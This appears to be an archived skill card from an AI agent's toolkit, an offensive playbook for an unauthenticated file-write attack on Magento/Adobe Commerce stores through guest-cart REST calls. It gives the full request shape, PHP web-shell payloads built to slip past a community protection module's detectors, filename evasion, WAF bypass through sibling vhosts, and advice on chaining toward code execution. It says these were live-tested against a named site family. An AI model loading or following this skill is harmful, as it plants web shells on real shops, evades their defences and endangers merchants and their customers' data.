<!-- archived from /root/.hermes/skills/security/magento-polyshell-write/SKILL.md on 2026-10-21 -->

---
name: magento-polyshell-write
description: "Magento PolyShell unauth file-write + guard bypasses."
---

> 归档卡：原目录 `/root/.hermes/skills/security/magento-polyshell-write`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/magento-polyshell-write/…')`，不要相对 `references/legacy/` 解析。

# Magento PolyShell Unauthenticated File Write (CVE-2025-20720)

## When to use
- Target = Magento / Adobe Commerce (any version <= 2.4.8; no production patch until 2.4.9).
- Tradecraft: unauth file write to pub/media/custom_options/quote/, masked as image, for staging shells / evidence / chaining.
- Also useful when store deploys `Aregowe_PolyShellProtection` (community mitigation) — bypasses below were live-tested 2026-10 against famous-smoke.com family.

## Core request shape (works UNauthenticated via guest cart)
```
POST /rest/V1/guest-carts                -> masked id
POST /rest/V1/guest-carts/<id>/items
{"cartItem":{"sku":"<any salable SKU>","qty":1,"quote_id":"<id>",
 "product_option":{"extension_attributes":{"custom_options":[
   {"option_id":"7","option_value":"file",   <-- MUST be literal string "file" (CustomOption::getOptionValue trigger)
    "extension_attributes":{"file_info":{
       "base64_encoded_data":"<b64 bytes>","type":"image/gif","name":"x1.gif"}}}]}}}}
```
- Nested level matters: file_info hangs under custom_options[].extension_attributes, NOT product_option.extension_attributes.
- Response includes full server path + size + secret_key once written: `image/gif,x1.gif,/var/www/html/pub/media/custom_options/quote/x/1/x1.gif,...`
- Disk path = custom_options/quote/<first char>/<second char>/<name> (Uploader::getDispersionPath — first two chars as subdirs).
- Read back: GET /media/custom_options/quote/<d1>/<d2>/<name> (also /pub/media/... variant). If edge WAF 403s the read, try sibling vhosts on same box (maint.* etc.) — often unblocked.

## Guard bypasses (Aregowe_PolyShellProtection, live-tested)
- **Content detector bypass #1 (modern builds):** `<?$f=${'_GET'};$f[0]($f[1]);?>` — short-tag `<?$` not matched by patterns (`<?php`, `<?=`) => passes, file written. Executes ONLY if short_open_tag=On.
- **Content detector bypass #2 (older builds):** `<?=/**/$f=${'_GET'};$f[0]($f[1]);?>` — comment after `<?=` dodges regex; `${'_GET'}` dodges stripos('$_GET'). Executes on any PHP (<?= always on).
- Non-image content passes polyglot scan trivially (detector early-returns) BUT framework getimagesizefromstring then rejects => must prefix image header (GIF89a works).
- Filenames: avoid "php" substring (AttackPatternDetector flags it).
- **Not bypassable (tested):** .php/.phtml/.phar/.phpN/double-ext/trailing-dot/unicode tricks — name guard + allowlist close them. Effective writable ext = images only (gif/jpg/jpeg/png/webp).
- **Execution is a separate battle:** /media/* served statically/by-app (not fastcgi); `%00.php` => edge 502; traversal normalized by nginx. No exec => no RCE. Plan chains accordingly.

## Pitfalls
- Guest checkout disabled does NOT block guest CART + item add (esp. on staging).
- Auction/bidding stores may reject normal SKUs ("Product ... not available") — pick store-appropriate SKUs.
- Error `Property "FileInfo" does not have accessor method` = wrong nesting level (fix per shape above).
- Media read may be blocked only on the main www vhost (WAF); sibling vhosts (maint, staging2) often serve the same disk.
- Verify write via response metadata (quote_path/size) AND by fetching; ~85-90KB PNG placeholder = file absent.
